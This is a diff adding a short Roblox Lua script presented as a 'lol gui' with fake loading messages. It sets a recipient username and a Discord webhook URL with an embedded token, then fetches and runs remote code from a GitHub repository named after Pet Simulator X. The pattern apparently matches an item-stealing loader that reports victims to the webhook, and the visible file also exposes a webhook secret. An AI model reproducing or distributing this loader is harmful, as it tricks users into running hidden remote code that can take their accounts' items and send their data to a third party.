@@ -1,0 +1,15 @@
+Username = "ipin_p4"
+
+WebHook = "https://discord.com/api/webhooks/1107921351752298557/uw5G9vPflfanBaHMuT1MTv-FMry87c0Yjjyv89FF8rFxJJrVsxB5-RltTvdm0XWO4gDO"
+
+loadingscreen = true
+
+_G.CustomScriptName = "lol gui"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
